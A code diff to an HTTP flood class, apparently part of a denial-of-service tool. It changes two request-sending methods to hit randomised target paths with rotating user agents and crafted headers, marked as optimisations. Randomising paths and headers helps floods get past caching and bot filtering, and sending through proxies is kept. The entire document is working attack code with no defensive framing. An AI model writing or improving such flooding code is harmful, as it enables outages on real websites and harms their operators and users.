@@ -1129,15 +1129,25 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def STRESS(self) -> None:
-        payload: bytes = self.generate_payload(
-            ("Content-Length: 524\r\n"
-             "X-Requested-With: XMLHttpRequest\r\n"
-             "Content-Type: application/json\r\n\r\n"
-             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                # [OPTIMIZED] Dynamic Path
+                path = self.get_random_target_path()
+                ua = randchoice(self._useragents)
+                headers = self.build_consistent_headers(ua)
+                
+                # Rebuild payload manually to include dynamic path
+                payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
+                           f"Host: {self._target.authority}\r\n"
+                           f"User-Agent: {ua}\r\n"
+                           f"{headers}"
+                           f"Content-Length: 524\r\n"
+                           f"X-Requested-With: XMLHttpRequest\r\n"
+                           f"Content-Type: application/json\r\n\r\n"
+                           f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
+                
+                Tools.send(s, payload.encode("utf-8"))
         Tools.safe_close(s)
 
     def COOKIES(self) -> None:
@@ -1254,14 +1264,18 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
+                # [OPTIMIZED] Dynamic Path
+                path = self.get_random_target_path()
+                full_url = f"{self._target.scheme}://{self._target.authority}{path}"
+                
                 if pro:
-                    with s.get(self._target.human_repr(),
+                    with s.get(full_url,
                                proxies=pro.asRequest()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
                         continue
 
-                with s.get(self._target.human_repr()) as res:
+                with s.get(full_url) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
